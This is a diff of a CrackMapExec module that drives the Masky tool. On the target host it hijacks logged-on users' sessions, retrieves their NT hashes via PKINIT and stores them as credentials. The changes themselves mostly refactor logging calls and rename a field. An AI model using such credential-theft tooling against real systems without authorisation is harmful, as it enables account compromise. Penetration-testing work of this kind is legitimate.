@@ -40,9 +40,7 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         if not self.ca:
-            context.log.error(
-                "Please provide a valid CA server and CA name (CA_SERVER\CA_NAME)"
-            )
+            context.log.fail("Please provide a valid CA server and CA name (CA_SERVER\CA_NAME)")
             return False
 
         host = connection.host
@@ -66,7 +64,7 @@ class CMEModule:
             file_args=self.file_args,
         )
 
-        context.log.info("Running Masky on the targeted host")
+        context.log.display("Running Masky on the targeted host")
         rslts = m.run(host)
         tracker = m.get_last_tracker()
 
@@ -76,38 +74,34 @@ class CMEModule:
 
     def process_results(self, connection, context, rslts, tracker):
         if not tracker.nb_hijacked_users:
-            context.log.info("No users' sessions were hijacked")
+            context.log.display("No users' sessions were hijacked")
         else:
-            context.log.info(
-                f"{tracker.nb_hijacked_users} session(s) successfully hijacked"
-            )
-            context.log.info("Attempting to retrieve NT hash(es) via PKINIT")
+            context.log.display(f"{tracker.nb_hijacked_users} session(s) successfully hijacked")
+            context.log.display("Attempting to retrieve NT hash(es) via PKINIT")
 
         if not rslts:
             return False
 
         pwned_users = 0
         for user in rslts.users:
-            if user.nt_hash:
-                context.log.highlight(f"{user.domain}\{user.name} {user.nt_hash}")
+            if user.nthash:
+                context.log.highlight(f"{user.domain}\{user.name} {user.nthash}")
                 self.process_credentials(connection, context, user)
                 pwned_users += 1
 
         if pwned_users:
             context.log.success(f"{pwned_users} NT hash(es) successfully collected")
         else:
-            context.log.error(
-                "Unable to collect NT hash(es) from the hijacked session(s)"
-            )
+            context.log.fail("Unable to collect NT hash(es) from the hijacked session(s)")
         return True
 
     def process_credentials(self, connection, context, user):
-        host = context.db.get_computers(connection.host)[0][0]
+        host = context.db.get_hosts(connection.host)[0][0]
         context.db.add_credential(
             "hash",
             user.domain,
             user.name,
-            user.nt_hash,
+            user.nthash,
             pillaged_from=host,
         )
         add_user_bh(user.name, user.domain, context.log, connection.config)
@@ -116,22 +110,15 @@ class CMEModule:
         ret = True
 
         if tracker.last_error_msg:
-            context.log.error(tracker.last_error_msg)
+            context.log.fail(tracker.last_error_msg)
             ret = False
 
         if not tracker.files_cleaning_success:
-            context.log.error("Fail to clean files related to Masky")
-            context.log.error(
-                (
-                    f"Please remove the files named '{tracker.agent_filename}', '{tracker.error_filename}', "
-                    f"'{tracker.output_filename}' & '{tracker.args_filename}' within the folder '\\Windows\\Temp\\'"
-                )
-            )
+            context.log.fail("Fail to clean files related to Masky")
+            context.log.fail((f"Please remove the files named '{tracker.agent_filename}', '{tracker.error_filename}', " f"'{tracker.output_filename}' & '{tracker.args_filename}' within the folder '\\Windows\\Temp\\'"))
             ret = False
 
         if not tracker.svc_cleaning_success:
-            context.log.error(
-                f"Fail to remove the service named '{tracker.svc_name}', please remove it manually"
-            )
+            context.log.fail(f"Fail to remove the service named '{tracker.svc_name}', please remove it manually")
             ret = False
         return ret
